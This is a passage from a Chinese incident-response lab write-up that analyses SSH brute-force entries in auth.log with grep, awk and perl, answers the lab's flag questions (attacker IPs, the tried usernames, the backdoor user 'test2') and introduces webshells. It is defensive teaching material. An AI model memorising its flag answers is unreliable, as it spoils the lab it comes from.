class="line">Aug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7528]: Connection closed by invalid user  192.168.200.2 port 37545 [preauth]</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7530]: Invalid user  from 192.168.200.2 port 39111</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2</span><br><span class="line">Aug  1 07:47:32 linux-rz sshd[7530]: Connection closed by invalid user  192.168.200.2 port 39111 [preauth]</span><br><span class="line">Aug  1 07:47:33 linux-rz sshd[7532]: Invalid user  from 192.168.200.2 port 35173</span><br><span class="line">Aug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7532]: Connection closed by invalid user  192.168.200.2 port 35173 [preauth]</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7534]: Invalid user  from 192.168.200.2 port 45807</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2</span><br><span class="line">Aug  1 07:47:41 linux-rz sshd[7534]: Connection closed by invalid user  192.168.200.2 port 45807 [preauth]</span><br><span class="line">Aug  1 07:50:29 linux-rz sshd[7505]: pam_unix(sshd:session): session closed for user root</span><br><span class="line">Aug  1 07:50:29 linux-rz systemd-logind[440]: Session 7 logged out. Waiting for processes to exit.</span><br><span class="line">Aug  1 07:50:29 linux-rz systemd-logind[440]: Removed session 7.</span><br><span class="line">Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2</span><br><span class="line">Aug  1 07:50:37 linux-rz sshd[7539]: pam_unix(sshd:session): session opened for user root by (uid=0)</span><br><span class="line">Aug  1 07:50:37 linux-rz systemd-logind[440]: New session 8 of user root.</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br><span class="line">Aug  1 07:50:52 linux-rz passwd[7563]: pam_unix(passwd:chauthtok): password changed for test2</span><br><span class="line">Aug  1 07:50:56 linux-rz sshd[7539]: Received disconnect from 192.168.200.2 port 48070:11: disconnected by user</span><br><span class="line">Aug  1 07:50:56 linux-rz sshd[7539]: Disconnected from user root 192.168.200.2 port 48070</span><br><span class="line">Aug  1 07:50:56 linux-rz sshd[7539]: pam_unix(sshd:session): session closed for user root</span><br><span class="line">Aug  1 07:50:56 linux-rz systemd-logind[440]: Session 8 logged out. Waiting for processes to exit.</span><br><span class="line">Aug  1 07:50:56 linux-rz systemd-logind[440]: Removed session 8.</span><br><span class="line">Aug  1 07:52:57 linux-rz sshd[7606]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.31  user=root</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2</span><br><span class="line">Aug  1 07:53:01 linux-rz sshd[7606]: Connection closed by authenticating user root 192.168.200.31 port 40364 [preauth]</span><br><span class="line">Aug  1 08:01:26 linux-rz sshd[748]: Received disconnect from 192.168.200.2 port 50378:11: disconnected by user</span><br><span class="line">Aug  1 08:01:26 linux-rz sshd[748]: Disconnected from user root 192.168.200.2 port 50378</span><br><span class="line">Aug  1 08:01:26 linux-rz sshd[748]: pam_unix(sshd:session): session closed for user root</span><br><span class="line">Aug  1 08:01:26 linux-rz systemd-logind[440]: Session 3 logged out. Waiting for processes to exit.</span><br><span class="line">Aug  1 08:01:26 linux-rz systemd-logind[440]: Removed session 3.</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;adm&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;dialout&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;cdrom&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;floppy&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;sudo&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;audio&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;dip&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;video&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;plugdev&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;netdev&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;adm&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;dialout&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;cdrom&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;floppy&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;sudo&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;audio&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;dip&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;video&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;plugdev&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;netdev&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 passwd[493]: password for &#x27;debian&#x27; changed by &#x27;root&#x27;</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.log</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session closed for user root</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on 0.0.0.0 port 22.</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event1 (Power Button)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on :: port 22.</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event2 (Sleep Button)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: New seat seat0.</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 passwd[418]: password for &#x27;debian&#x27; changed by &#x27;root&#x27;</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: Watching system buttons on /dev/input/event1 (Power Button)</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: Watching system buttons on /dev/input/event2 (Sleep Button)</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 systemd-logind[432]: New seat seat0.</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 sshd[465]: Server listening on 0.0.0.0 port 22.</span><br><span class="line">Apr 21 05:55:16 ip-10-0-10-3 sshd[465]: Server listening on :: port 22.</span><br></pre></td></tr></table></figure>

<p>接着，那既然是爆破，肯定会有很多的失败次数，那我们可以</p>
<ul>
<li><strong>使用grep筛选出SSH失败的登录尝试</strong>： 我们需要筛选出涉及到SSH失败登录尝试的日志条目。</li>
</ul>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421140305559.png" alt="image-20250421140305559"></p>
<p>因为是查看尝试爆破主机root账号的，所以我们只需要关注root管理员用户就行，user的就不用管了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password for root&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421140436360.png" alt="image-20250421140436360"></p>
<p>这里的话因为内容不多，如果数据内容很多的话可以用更精准的命令去筛选</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>

<p>简单来说就是分析<code>auth.log.1</code>日志文件，提取出所有包含”Failed password for root “字符串的行，然后使用<code>awk</code>命令提取每行的第11个字段（通常这个字段表示远程IP地址），之后对这些IP地址进行排序和统计，最后按照数量的降序排列，并通过<code>more</code>命令分页显示结果。</p>
<p>命令解释：</p>
<ul>
<li><p><code>cat /var/log/auth.log.1</code>：cat 命令用于显示 auth.log.1 文件的内容。这里 auth.log.1 是一个日志文件，通常是系统日志的备份文件。</p>
</li>
<li><p><code>grep -a &quot;Failed password for root&quot;</code>：grep 命令用于在输入中搜索包含特定模式的行。</p>
</li>
<li><p><code>awk &#39;&#123;print \$11&#125;&#39;</code>：用于提取每行的第 11 个字段（列）。（以空格或制表符为默认分隔符）。</p>
</li>
<li><p><code>sort</code>：用于对输入行进行排序。</p>
</li>
<li><p><code>uniq -c </code>：uniq 命令用于删除重复的行。-c 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。</p>
</li>
<li><p><code>sort -nr</code>：sort 命令再次用于排序。-n 选项表示按数值进行排序。-r 选项表示按降序排序。组合起来，即按出现次数从高到低排序。</p>
</li>
<li><p><code>more</code>：more 命令用于分页显示输出。由于输出可能很长，more 命令允许用户逐页查看结果。</p>
</li>
</ul>
<p>最终所有的命令用管道符连接，将前一个命令的输出当成下一个命令的输入</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421141412107.png" alt="image-20250421141412107"></p>
<ul>
<li><strong>提取IP地址</strong>： 从这些日志条目中提取尝试登录的IP地址。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.2,192.168.200.31,192.168.200.32</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>统计各个IP地址的尝试次数</strong>： 统计每个IP地址的尝试次数，找出所有尝试暴力破解的IP。</li>
</ul>
<p>从上面就可以看到，第一列就是该ip尝试的次数</p>
<p>将这几个ip从大到小排序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</span><br></pre></td></tr></table></figure>

<p>额外的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br></pre></td></tr></table></figure>

<h5 id="问题2-ssh爆破成功登陆的IP是多少"><a href="#问题2-ssh爆破成功登陆的IP是多少" class="headerlink" title="问题2:ssh爆破成功登陆的IP是多少"></a>问题2:ssh爆破成功登陆的IP是多少</h5><p>直接给命令吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Accepted &quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421141909800.png" alt="image-20250421141909800"></p>
<p>搜查那个Accepted登录成功的用户ip</p>
<p>或者也可以用之前的命令</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421141943517.png" alt="image-20250421141943517"></p>
<p>有一个问题，为什么是Accepted?</p>
<p>在Linux系统的认证日志（例如<code>auth.log</code>）中，”Accepted”这个词通常用来标识成功的登录尝试。当一个用户或者系统通过认证机制成功登录时，相关的日志条目会包含”Accepted”这个词。这包括通过SSH、FTP、sudo等方式的成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h5 id="问题3-爆破用户名字典是什么？"><a href="#问题3-爆破用户名字典是什么？" class="headerlink" title="问题3:爆破用户名字典是什么？"></a>问题3:爆破用户名字典是什么？</h5><p>斯，首先我们得思考一下</p>
<h6 id="什么是爆破用户名字典"><a href="#什么是爆破用户名字典" class="headerlink" title="什么是爆破用户名字典"></a>什么是爆破用户名字典</h6><p>简单来说指黑客在进行暴力破解攻击时使用的一系列用户名字典文件。黑客通过自动化工具逐个尝试这些用户名，结合常见或默认密码，试图找到有效的登录凭据。这个过程被称为“字典攻击”或“暴力破解攻击”。</p>
<p>字典内容</p>
<p>用户名字典可能包括：</p>
<ul>
<li>常见的用户名（如 admin、root、user、guest 等）</li>
<li>与目标组织相关的用户名（如员工姓名、部门名等）</li>
<li>组合用户名（如名字和姓氏的组合）</li>
</ul>
<p>那我们的具体实现步骤是什么</p>
<ul>
<li>识别关键日志条目：</li>
</ul>
<p>确定日志中包含攻击相关信息的条目。例如，SSH 失败登录尝试通常包含“Failed password”关键字，成功登录则包含“Accepted”。</p>
<ul>
<li>提取有用信息：</li>
</ul>
<p>使用文本处理工具如 grep、awk、perl 或 sed 提取出关键数据。例如，可以从日志中提取出失败尝试的用户名、IP地址、时间戳等。</p>
<ul>
<li>统计分析：</li>
</ul>
<p>对提取出的信息进行统计分析，以确定被尝试最多的用户名和来源IP等。例如，使用 uniq 和 sort 对数据进行去重和排序。</p>
<p>那我们先看看刚刚登录失败的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-3:/var/log# cat auth.log.1  | grep -a &quot;Failed password&quot;</span><br><span class="line">Aug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2</span><br><span class="line">Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2</span><br><span class="line">Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2</span><br><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2</span><br><span class="line">Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2</span><br><span class="line">Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2</span><br><span class="line">Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2</span><br><span class="line">Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2</span><br><span class="line">Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2</span><br><span class="line">Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2</span><br><span class="line">Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2</span><br><span class="line">Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2</span><br><span class="line">Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2</span><br></pre></td></tr></table></figure>

<p>随便取一条日志看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Failed password</code>：密码错误的提示</li>
<li><code>for invalid user test1</code>：尝试登录的用户名是 <code>test1</code>，但系统判定为 <strong>无效用户</strong></li>
<li><code>from 192.168.200.35 port 33874</code>：源ip和端口</li>
</ul>
<p>所以我们可以直接筛选出来不同攻击ip的字典</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.2:</span><br><span class="line">root，user，hello，空字符</span><br><span class="line">192.168.200.31:</span><br><span class="line">root</span><br><span class="line">192.168.200.32:</span><br><span class="line">root</span><br><span class="line">192.168.200.35:</span><br><span class="line">test1，test2，test3</span><br></pre></td></tr></table></figure>

<p>或者可以用命令去精准筛选</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421143055472.png" alt="image-20250421143055472"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">显示信息格式:&lt;尝试次数&gt; &lt;错误类型&gt; &lt;用户名&gt;</span><br></pre></td></tr></table></figure>

<p>这里使用Perl脚本提取出失败尝试的用户名和来源IP地址，统计每个用户名的失败尝试次数，并按照次数降序排列显示结果。</p>
<p>具体分析一下:</p>
<ul>
<li><code>perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#39;</code>:作用：使用Perl脚本从每一行提取出失败登录尝试的用户名。</li>
</ul>
<p><code>while($_=&lt;&gt;)</code>：逐行读取输入。</p>
<p><code>/for(.*?) from/</code>：使用正则表达式匹配模式<code>“for [username] from”</code>，其中[username]是登录尝试的用户名。</p>
<p><code>print &quot;$1\n&quot;</code>：将提取的用户名打印出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<h5 id="问题4-成功登录-root-用户的-ip-一共爆破了多少次"><a href="#问题4-成功登录-root-用户的-ip-一共爆破了多少次" class="headerlink" title="问题4:成功登录 root 用户的 ip 一共爆破了多少次"></a>问题4:成功登录 root 用户的 ip 一共爆破了多少次</h5><p>之前就知道成功登录的用户ip是192.168.200.2，然后再看这个ip爆破root爆破了几次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password for root &quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421143709858.png" alt="image-20250421143709858"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>

<h5 id="问题5-黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#问题5-黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="问题5:黑客登陆主机后新建了一个后门用户，用户名是多少"></a>问题5:黑客登陆主机后新建了一个后门用户，用户名是多少</h5><p>这个又是一个新的知识点了</p>
<p>在做这个操作时，我们应该逐步分析一下我们需要怎么做</p>
<ul>
<li><p>步骤1：确定日志文件</p>
</li>
<li><p>步骤2：搜索创建用户的关键字</p>
</li>
<li><p>步骤3：提取新用户信息</p>
</li>
</ul>
<p>例如，假设你得到了如下输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Jan 12 10:32:15 server useradd[1234]: new user: name=testuser, UID=1001, GID=1001, home=/home/testuser, shell=/bin/bash</span><br><span class="line">这条日志显示了创建的新用户 testuser。</span><br><span class="line">增加一个kali用户日志</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br></pre></td></tr></table></figure>

<ul>
<li>步骤4：分析执行上下文</li>
</ul>
<p>确认新用户的创建是否由合法用户执行，或是否有可疑的远程登录记录。</p>
<ul>
<li>步骤5：进一步确认</li>
</ul>
<p>结合其他日志文件，如 &#x2F;var&#x2F;log&#x2F;syslog，查看是否有异常的命令执行或系统变更。</p>
<p>所以我们的命令应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;new&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421143903253.png" alt="image-20250421143903253"></p>
<p>然后可以看到有两个新用户，但是只有第一个是在主机上创建的新用户，第二个可能是在云服务器上进行创建的新用户，实在不行我们可以先看看登录成功的时间，因为登录时间左右黑客首先就会选择创建后门用户</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421144418703.png" alt="image-20250421144418703"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>

<p>至此关于Linux的日志分析就告一段落，建议学习的时候多进行手撸命令而不是ctrl+c和ctrl+v复制粘贴，同时感谢大佬的wp让我学到了很多知识，wp真的很细！！！</p>
<h3 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h3><h4 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h4><p><strong>Webshell</strong> 是一种通过 Web 服务器接口提供命令执行能力的恶意脚本。它通常被攻击者上传到受入侵的 Web 服务器上，以便远程执行命令和控制服务器。</p>
<p>特点：</p>
<ul>
<li><strong>脚本语言</strong>：通常用 PHP、ASP、JSP、Python 等编写，依赖于目标服务器的环境。</li>
<li><strong>功能</strong>：文件管理、命令执行、数据库操作、网络连接、权限提升等。</li>
<li><strong>隐蔽性</strong>：通常伪装成正常文件或与网站现有文件混在一起，可能被混淆以逃避检测。</li>
<li><strong>通信</strong>：使用 HTTP&#x2F;HTTPS 协议进行通信，易于隐藏在普通网络流量中。</li>
</ul>
